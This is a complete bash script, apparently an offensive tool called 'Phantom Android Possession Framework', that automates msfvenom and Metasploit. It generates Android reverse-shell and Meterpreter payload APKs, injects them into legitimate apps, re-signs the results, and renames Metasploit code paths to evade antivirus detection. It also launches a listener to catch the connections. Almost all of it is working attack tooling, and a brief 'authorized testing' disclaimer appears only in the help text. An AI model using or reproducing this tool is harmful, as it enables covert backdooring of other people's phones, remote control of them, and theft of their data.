#!/usr/bin/env bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[1;33m'
blue='\033[0;34m'
purple='\033[0;35m'
cyan='\033[0;36m'
white='\033[1;37m'
dark='\033[1;30m'
reset='\033[0m'
bold='\033[1m'

clear

CONFIG_FILE="phantom_config.json"
PAYLOAD_DIR="payloads"
APKTOOL_PATH="tools/apktool.jar"

PAYLOAD_TYPES=(
"android/shell/reverse_tcp|Standard shell over TCP - Simple and reliable"
"android/shell/reverse_http|Shell over HTTP - Can bypass some firewalls"
"android/shell/reverse_https|Shell over HTTPS - Encrypted communication"
"android/meterpreter/reverse_tcp|Full Meterpreter over TCP - Most features"
"android/meterpreter/reverse_http|Meterpreter over HTTP - Web friendly"
"android/meterpreter/reverse_https|Meterpreter over HTTPS - Secure & stealthy"
"android/meterpreter_reverse_tcp|Stage-less Meterpreter TCP - Self-contained"
"android/meterpreter_reverse_http|Stage-less Meterpreter HTTP - No staging"
"android/meterpreter_reverse_https|Stage-less Meterpreter HTTPS - Most stealthy"
)

function init_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        cat > "$CONFIG_FILE" <<EOF
{
    "LHOST": "",
    "LPORT": "",
    "PAYLOAD": "",
    "CHECKED": false
}
EOF
    fi
}

function load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        LHOST=$(grep -o '"LHOST":"[^"]*"' "$CONFIG_FILE" | cut -d'"' -f4)
        LPORT=$(grep -o '"LPORT":[0-9]*' "$CONFIG_FILE" | cut -d':' -f2)
        PAYLOAD=$(grep -o '"PAYLOAD":"[^"]*"' "$CONFIG_FILE" | cut -d'"' -f4)
        CHECKED=$(grep -o '"CHECKED":[^,}]*' "$CONFIG_FILE" | cut -d':' -f2 | tr -d ' ')
        if [ -n "$LHOST" ] && [ -n "$LPORT" ] && [ -n "$PAYLOAD" ]; then
            return 0
        fi
    fi
    return 1
}

function save_config() {
    cat > "$CONFIG_FILE" <<EOF
{
    "LHOST": "$LHOST",
    "LPORT": $LPORT,
    "PAYLOAD": "$PAYLOAD",
    "CHECKED": true
}
EOF
}

function check_deps() {
    if [ "$CHECKED" = "true" ] && [ -f "$CONFIG_FILE" ]; then
        echo -e "${green}[✔] Dependencies already verified${reset}"
        return 0
    fi

    echo -e "${yellow}[*] Checking dependencies...${reset}"
    local deps=("msfconsole" "xterm" "zenity" "aapt" "apktool" "zipalign")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! which "$dep" > /dev/null 2>&1; then
            missing+=("$dep")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${red}[!] Missing dependencies: ${missing[*]}${reset}"
        echo -e "${yellow}[*] Installing missing packages...${reset}"
        for dep in "${missing[@]}"; do
            pkg install "$dep" -y 2>/dev/null || apt install "$dep" -y 2>/dev/null
        done
        echo -e "${green}[✔] Dependencies installed${reset}"
    else
        echo -e "${green}[✔] All dependencies found${reset}"
    fi

    CHECKED="true"
    save_config
    sleep 1
}

function get_lhost() {
    local ip=$(ifconfig 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -1)
    if [ -z "$ip" ]; then
        ip=$(ip addr 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -1)
    fi
    if [ -z "$ip" ]; then
        ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    fi
    if [ -z "$ip" ]; then
        ip="127.0.0.1"
    fi
    LHOST=$ip
}

function show_payload_menu() {
    clear
    echo -e "${cyan} ════════════════════════════════════════════════════════════ ${reset}"
    echo -e "${cyan}            ${bold}PHANTOM ANDROID PAYLOAD LIBRARY${reset}${cyan}             ${reset}"
    echo -e "${cyan} ════════════════════════════════════════════════════════════ ${reset}"
    echo ""
    local i=1
    for entry in "${PAYLOAD_TYPES[@]}"; do
        payload_name="${entry%%|*}"
        payload_desc="${entry##*|}"
        printf "${green}[%2d]${reset} ${bold}%s${reset}\n" "$i" "$payload_name"
        printf "     ${dark}%s${reset}\n" "$payload_desc"
        ((i++))
    done
    echo ""
    echo -e "${cyan}[0]${reset} ${bold}Enter custom payload${reset}"
    echo -e "${yellow}════════════════════════════════════════════════════════════${reset}"
    echo -n -e "${green}[?] Select payload number: ${reset}"
    read choice

    if [[ "$choice" =~ ^[0-9]+$ ]]; then
        if [ "$choice" -eq 0 ]; then
            echo -n -e "${green}[?] Enter custom payload: ${reset}"
            read PAYLOAD
        elif [ "$choice" -ge 1 ] && [ "$choice" -le ${#PAYLOAD_TYPES[@]} ]; then
            PAYLOAD="${PAYLOAD_TYPES[$((choice-1))]%%|*}"
        else
            echo -e "${red}[!] Invalid choice. Using default: ${PAYLOAD_TYPES[0]%%|*}${reset}"
            PAYLOAD="${PAYLOAD_TYPES[0]%%|*}"
        fi
    else
        echo -e "${red}[!] Invalid input. Using default: ${PAYLOAD_TYPES[0]%%|*}${reset}"
        PAYLOAD="${PAYLOAD_TYPES[0]%%|*}"
    fi
    save_config
}

function list_payloads() {
    clear
    echo -e "${cyan} ════════════════════════════════════════════════════════════ ${reset}"
    echo -e "${cyan}            ${bold}YOUR BUILT PAYLOADS${reset}${cyan}                         ${reset}"
    echo -e "${cyan} ════════════════════════════════════════════════════════════ ${reset}"
    echo ""

    if [ ! -d "$PAYLOAD_DIR" ]; then
        mkdir -p "$PAYLOAD_DIR"
    fi

    local payloads=()
    local i=1
    for file in "$PAYLOAD_DIR"/*.apk; do
        if [ -f "$file" ]; then
            filename=$(basename "$file")
            payloads+=("$filename")
            printf "${green}[%2d]${reset} %s\n" "$i" "$filename"
            ((i++))
        fi
    done

    if [ ${#payloads[@]} -eq 0 ]; then
        echo -e "${yellow}[!] No payloads found in $PAYLOAD_DIR${reset}"
        echo -e "${yellow}[!] Build one first using option [1] or [4]${reset}"
        echo ""
        read -p "Press [Enter] to return..."
        return 1
    fi

    echo ""
    echo -e "${yellow}════════════════════════════════════════════════════════════${reset}"
    echo -n -e "${green}[?] Select payload number: ${reset}"
    read choice

    if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le ${#payloads[@]} ]; then
        SELECTED_PAYLOAD="${payloads[$((choice-1))]}"
        return 0
    else
        echo -e "${red}[!] Invalid selection${reset}"
        sleep 2
        return 1
    fi
}

function get_target_apk() {
    echo ""
    echo -e "${yellow}[?] Enter target APK path:${reset}"
    echo -e "${dark}   (Example: /storage/emulated/0/Download/myapp.apk)${reset}"
    echo -n -e "${green}[>] Path: ${reset}"
    read TARGET_APK

    if [ -z "$TARGET_APK" ]; then
        echo -e "${red}[!] No path provided${reset}"
        return 1
    fi

    if [ ! -f "$TARGET_APK" ]; then
        echo -e "${red}[!] File not found: $TARGET_APK${reset}"
        return 1
    fi

    if [[ ! "$TARGET_APK" == *.apk ]]; then
        echo -e "${red}[!] Not an APK file${reset}"
        return 1
    fi

    return 0
}

function spinlong() {
    bar=" ████████████████████████████████████████████████████████████"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\r${green}[%-${barlength}s]${reset}" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
    printf "\n"
}

function generate_payload() {
    echo -e "${yellow}[*] Generating payload...${reset}"
    spinlong

    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -a dalvik --platform android R -o "$PAYLOAD_DIR/$OUTPUT_NAME.apk" > /dev/null 2>&1

    if [ $? -ne 0 ]; then
        echo -e "${red}[!] Failed to generate payload${reset}"
        echo -e "${red}[!] Check: LHOST=$LHOST LPORT=$LPORT PAYLOAD=$PAYLOAD${reset}"
        return 1
    fi

    echo -e "${green}[✔] Payload generated: $PAYLOAD_DIR/$OUTPUT_NAME.apk${reset}"
    return 0
}

function embed_payload() {
    echo -e "${yellow}[*] Embedding payload into target APK...${reset}"
    spinlong

    local base_name=$(basename "$TARGET_APK" .apk)
    local output_name="${base_name}_phantom.apk"

    msfvenom -x "$TARGET_APK" -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -a dalvik --platform android R -o "$PAYLOAD_DIR/$output_name" > /dev/null 2>&1

    if [ $? -ne 0 ]; then
        echo -e "${red}[!] Failed to embed payload${reset}"
        return 1
    fi

    echo -e "${green}[✔] Payload embedded: $PAYLOAD_DIR/$output_name${reset}"
    return 0
}

function embed_advanced() {
    echo -e "${yellow}[*] Advanced embedding process...${reset}"
    spinlong

    local base_name=$(basename "$TARGET_APK" .apk)
    local output_name="${base_name}_phantom_adv.apk"

    cp "$PAYLOAD_DIR/$SELECTED_PAYLOAD" "temp_payload.apk"

    echo -e "${yellow}[*] Decompiling target APK...${reset}"
    spinlong
    java -jar "$APKTOOL_PATH" d -f -o temp_target "$TARGET_APK" > /dev/null 2>&1

    echo -e "${yellow}[*] Decompiling payload APK...${reset}"
    spinlong
    java -jar "$APKTOOL_PATH" d -f -o temp_payload "temp_payload.apk" > /dev/null 2>&1

    echo -e "${yellow}[*] Merging payload into target...${reset}"
    spinlong
    cp -r temp_payload/smali/* temp_target/smali/ 2>/dev/null
    cp -r temp_payload/res/* temp_target/res/ 2>/dev/null

    echo -e "${yellow}[*] Rebuilding APK...${reset}"
    spinlong
    java -jar "$APKTOOL_PATH" b temp_target -o "temp_rebuilt.apk" > /dev/null 2>&1

    echo -e "${yellow}[*] Signing APK...${reset}"
    spinlong
    if [ ! -f ~/.android/debug.keystore ]; then
        mkdir -p ~/.android
        keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Phantom, OU=Dev, O=Phantom, L=City, S=State, C=US" > /dev/null 2>&1
    fi

    jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA temp_rebuilt.apk androiddebugkey > /dev/null 2>&1
    zipalign 4 temp_rebuilt.apk "$PAYLOAD_DIR/$output_name" > /dev/null 2>&1

    rm -rf temp_target temp_payload temp_payload.apk temp_rebuilt.apk

    echo -e "${green}[✔] Advanced embedding complete: $PAYLOAD_DIR/$output_name${reset}"
    return 0
}

function inject_payload() {
    echo -e "${cyan}════════════════════════════════════════════════════════════${reset}"
    echo -e "${bold}${purple}    PHANTOM INJECTOR - APK Payload Injection${reset}"
    echo -e "${cyan}════════════════════════════════════════════════════════════${reset}"
    echo ""

    if ! list_payloads; then
        return
    fi

    if ! get_target_apk; then
        echo ""
        read -p "Press [Enter] to return..."
        return
    fi

    echo ""
    echo -e "${yellow}[i] Selected payload: $SELECTED_PAYLOAD${reset}"
    echo -e "${yellow}[i] Target APK: $TARGET_APK${reset}"
    echo ""
    echo -e "${cyan}╔════════════════════════════════════════════════════════════╗${reset}"
    echo -e "${cyan}║  ${bold}Choose injection method${reset}${cyan}                                    ║${reset}"
    echo -e "${cyan}╠════════════════════════════════════════════════════════════╣${reset}"
    echo -e "${cyan}║  ${green}[1]${reset} ${bold}Quick Embed${reset} - Fast, simple injection            ${cyan}║${reset}"
    echo -e "${cyan}║  ${green}[2]${reset} ${bold}Advanced Inject${reset} - Better stealth & compatibility ${cyan}║${reset}"
    echo -e "${cyan}╚════════════════════════════════════════════════════════════╝${reset}"
    echo -n -e "${green}[?] Select method: ${reset}"
    read method

    case $method in
        1)
            embed_payload
            ;;
        2)
            embed_advanced
            ;;
        *)
            echo -e "${red}[!] Invalid option${reset}"
            ;;
    esac

    echo ""
    read -p "Press [Enter] to continue..."
}

function start_listener() {
    echo -e "${yellow}[*] Starting listener on $LHOST:$LPORT${reset}"
    echo -e "${yellow}[*] Payload: $PAYLOAD${reset}"
    echo ""
    msfconsole -x "use multi/handler; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit"
}

function clean_files() {
    echo -e "${yellow}[*] Cleaning files...${reset}"
    rm -rf temp_* 2>/dev/null
    rm -f *.apk 2>/dev/null
    echo -e "${green}[✔] Cleanup complete${reset}"
}

function show_header() {
    clear
    echo -e "${red}${bold}"
    echo "    ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗"
    echo "    ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║"
    echo "    ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║"
    echo "    ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║"
    echo "    ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║"
    echo "    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝"
    echo -e "${reset}"
    echo -e "${red}${bold}     ═══════════ ANDROID POSSESSION FRAMEWORK ═══════════${reset}"
    echo -e "${dark}    \"Your code, your rules, their device...\"${reset}"
    echo -e "${red}    ═════════════════════════════════════════════════════════${reset}"
    echo ""
}

function show_menu() {
    echo -e "${cyan}╔════════════════════════════════════════════════════════════╗${reset}"
    echo -e "${cyan}║  ${bold}${purple}MAIN MENU${reset}${cyan}                                                 ║${reset}"
    echo -e "${cyan}╠════════════════════════════════════════════════════════════╣${reset}"
    echo -e "${cyan}║  ${green}[1]${reset} ${bold}Build New Payload${reset}                                     ${cyan}║${reset}"
    echo -e "${cyan}║  ${green}[2]${reset} ${bold}Inject into Existing APK${reset}                              ${cyan}║${reset}"
    echo -e "${cyan}║  ${green}[3]${reset} ${bold}Start Listener${reset}                                        ${cyan}║${reset}"
    echo -e "${cyan}║  ${green}[4]${reset} ${bold}Bypass AV - Custom Build${reset}                              ${cyan}║${reset}"
    echo -e "${cyan}║  ${green}[c]${reset} ${bold}Clean Files${reset}                                           ${cyan}║${reset}"
    echo -e "${cyan}║  ${green}[h]${reset} ${bold}Help${reset}                                                  ${cyan}║${reset}"
    echo -e "${cyan}║  ${green}[q]${reset} ${bold}Exit${reset}                                                  ${cyan}║${reset}"
    echo -e "${cyan}╚════════════════════════════════════════════════════════════╝${reset}"
    echo -n -e "${green}[?] Select option: ${reset}"
}

function build_payload() {
    echo -e "${cyan}════════════════════════════════════════════════════════════${reset}"
    echo -e "${bold}${purple}    PHANTOM PAYLOAD BUILDER${reset}"
    echo -e "${cyan}════════════════════════════════════════════════════════════${reset}"
    echo ""

    if load_config; then
        echo -e "${yellow}[i] Loaded config: LHOST=$LHOST, LPORT=$LPORT${reset}"
        echo -n -e "${green}[?] Change settings? (y/n): ${reset}"
        read change
        if [[ "$change" == "y" || "$change" == "Y" ]]; then
            get_lhost
            echo -e "${yellow}[i] Detected IP: $LHOST${reset}"
            echo -n -e "${green}[?] Enter LHOST (Enter for auto): ${reset}"
            read input_lhost
            [ -n "$input_lhost" ] && LHOST="$input_lhost"
            echo -n -e "${green}[?] Enter LPORT (default 4444): ${reset}"
            read input_lport
            [ -n "$input_lport" ] && LPORT="$input_lport" || LPORT=4444
            show_payload_menu
            save_config
        fi
    else
        get_lhost
        echo -e "${yellow}[i] Detected IP: $LHOST${reset}"
        echo -n -e "${green}[?] Enter LHOST (Enter for auto): ${reset}"
        read input_lhost
        [ -n "$input_lhost" ] && LHOST="$input_lhost"
        echo -n -e "${green}[?] Enter LPORT (default 4444): ${reset}"
        read input_lport
        [ -n "$input_lport" ] && LPORT="$input_lport" || LPORT=4444
        show_payload_menu
        save_config
    fi

    echo ""
    echo -n -e "${green}[?] Output name (no extension): ${reset}"
    read OUTPUT_NAME
    [ -z "$OUTPUT_NAME" ] && OUTPUT_NAME="phantom_$(date +%s)"

    mkdir -p "$PAYLOAD_DIR"
    generate_payload
    echo ""
    read -p "Press [Enter] to continue..."
}

function bypass_build() {
    echo -e "${cyan}════════════════════════════════════════════════════════════${reset}"
    echo -e "${bold}${purple}    PHANTOM AV BYPASS BUILDER${reset}"
    echo -e "${cyan}════════════════════════════════════════════════════════════${reset}"
    echo ""

    if load_config; then
        echo -e "${yellow}[i] Loaded config: LHOST=$LHOST, LPORT=$LPORT${reset}"
        echo -n -e "${green}[?] Change settings? (y/n): ${reset}"
        read change
        if [[ "$change" == "y" || "$change" == "Y" ]]; then
            get_lhost
            echo -e "${yellow}[i] Detected IP: $LHOST${reset}"
            echo -n -e "${green}[?] Enter LHOST (Enter for auto): ${reset}"
            read input_lhost
            [ -n "$input_lhost" ] && LHOST="$input_lhost"
            echo -n -e "${green}[?] Enter LPORT (default 4444): ${reset}"
            read input_lport
            [ -n "$input_lport" ] && LPORT="$input_lport" || LPORT=4444
            show_payload_menu
            save_config
        fi
    else
        get_lhost
        echo -e "${yellow}[i] Detected IP: $LHOST${reset}"
        echo -n -e "${green}[?] Enter LHOST (Enter for auto): ${reset}"
        read input_lhost
        [ -n "$input_lhost" ] && LHOST="$input_lhost"
        echo -n -e "${green}[?] Enter LPORT (default 4444): ${reset}"
        read input_lport
        [ -n "$input_lport" ] && LPORT="$input_lport" || LPORT=4444
        show_payload_menu
        save_config
    fi

    echo ""
    echo -n -e "${green}[?] Output name (no extension): ${reset}"
    read OUTPUT_NAME
    [ -z "$OUTPUT_NAME" ] && OUTPUT_NAME="phantom_$(date +%s)"

    mkdir -p "$PAYLOAD_DIR"

    echo -e "${yellow}[*] Generating stealth payload...${reset}"
    spinlong

    local var1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
    local var2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)

    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -a dalvik --platform android R -o "temp_stealth.apk" > /dev/null 2>&1

    if [ $? -ne 0 ]; then
        echo -e "${red}[!] Failed to generate payload${reset}"
        read -p "Press [Enter] to continue..."
        return
    fi

    echo -e "${yellow}[*] Decompiling for AV evasion...${reset}"
    spinlong
    java -jar "$APKTOOL_PATH" d -f -o temp_dec "temp_stealth.apk" > /dev/null 2>&1

    echo -e "${yellow}[*] Applying stealth modifications...${reset}"
    spinlong

    if [ -d "temp_dec/smali/com/metasploit" ]; then
        mv temp_dec/smali/com/metasploit temp_dec/smali/com/"$var1"
        mv temp_dec/smali/com/"$var1"/stage temp_dec/smali/com/"$var1"/"$var2"
        sed -i "s#com/metasploit/stage#com/$var1/$var2#g" temp_dec/smali/com/"$var1"/"$var2"/* 2>/dev/null
        sed -i "s#metasploit#$var2#g" temp_dec/AndroidManifest.xml 2>/dev/null
        sed -i "s#MainActivity#$OUTPUT_NAME#g" temp_dec/res/values/strings.xml 2>/dev/null
    fi

    echo -e "${yellow}[*] Rebuilding with modifications...${reset}"
    spinlong
    java -jar "$APKTOOL_PATH" b temp_dec -o "temp_rebuilt.apk" > /dev/null 2>&1

    echo -e "${yellow}[*] Signing...${reset}"
    spinlong
    if [ ! -f ~/.android/debug.keystore ]; then
        mkdir -p ~/.android
        keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Phantom, OU=Dev, O=Phantom, L=City, S=State, C=US" > /dev/null 2>&1
    fi

    jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA temp_rebuilt.apk androiddebugkey > /dev/null 2>&1
    zipalign 4 temp_rebuilt.apk "$PAYLOAD_DIR/${OUTPUT_NAME}_stealth.apk" > /dev/null 2>&1

    rm -rf temp_dec temp_stealth.apk temp_rebuilt.apk

    echo -e "${green}[✔] Stealth payload created: $PAYLOAD_DIR/${OUTPUT_NAME}_stealth.apk${reset}"
    echo -e "${yellow}[i] This payload has been obfuscated to avoid AV detection${reset}"
    echo ""
    read -p "Press [Enter] to continue..."
}

function show_help() {
    clear
    echo -e "${purple}${bold}══════════════════════════════════════════════════════════════════${reset}"
    echo -e "${purple}${bold}                    PHANTOM FRAMEWORK HELP${reset}"
    echo -e "${purple}${bold}══════════════════════════════════════════════════════════════════${reset}"
    echo ""
    echo -e "${cyan}${bold}DESCRIPTION:${reset}"
    echo -e "${white}  Phantom is a powerful Android payload generation and injection framework.${reset}"
    echo -e "${white}  It automates the process of creating backdoored APKs with AV evasion.${reset}"
    echo ""
    echo -e "${cyan}${bold}FEATURES:${reset}"
    echo -e "${green}  [1]${reset} ${white}Build New Payload${reset}     - Generate a standalone payload APK"
    echo -e "${green}  [2]${reset} ${white}Inject into Existing APK${reset} - Inject payload into any APK"
    echo -e "${green}  [3]${reset} ${white}Start Listener${reset}        - Start Metasploit handler"
    echo -e "${green}  [4]${reset} ${white}Bypass AV Build${reset}       - Generate stealth payloads"
    echo ""
    echo -e "${cyan}${bold}INJECTION METHODS:${reset}"
    echo -e "${yellow}  Quick Embed${reset}    - Fast injection using msfvenom -x"
    echo -e "${yellow}  Advanced Inject${reset} - Full decompile/rebuild for better compatibility"
    echo ""
    echo -e "${cyan}${bold}REQUIREMENTS:${reset}"
    echo -e "${white}  - Metasploit Framework${reset}"
    echo -e "${white}  - Android SDK tools (aapt, apktool, zipalign)${reset}"
    echo -e "${white}  - Java Runtime Environment${reset}"
    echo ""
    echo -e "${cyan}${bold}WARNING:${reset}"
    echo -e "${red}  This tool is for educational and authorized testing purposes only.${reset}"
    echo -e "${red}  Never use on devices you don't own or have explicit permission to test.${reset}"
    echo ""
    echo -e "${purple}${bold}══════════════════════════════════════════════════════════════════${reset}"
    echo ""
    read -p "Press [Enter] to return..."
}

function main() {
    init_config
    check_deps

    while true; do
        show_header
        show_menu
        read option
        echo ""

        case "$option" in
            1) build_payload ;;
            2) inject_payload ;;
            3)
                load_config
                if [ -z "$LHOST" ] || [ -z "$LPORT" ] || [ -z "$PAYLOAD" ]; then
                    echo -e "${red}[!] No configuration found. Build a payload first.${reset}"
                    sleep 2
                    continue
                fi
                start_listener
                ;;
            4) bypass_build ;;
            c) clean_files ;;
            h) show_help ;;
            q)
                echo -e "${red}${bold}Exiting Phantom Framework...${reset}"
                echo -e "${dark}\"The ghost in the machine...\"${reset}"
                echo ""
                exit 0
                ;;
            *)
                echo -e "${red}[!] Invalid option${reset}"
                sleep 1
                ;;
        esac
    done
}

main
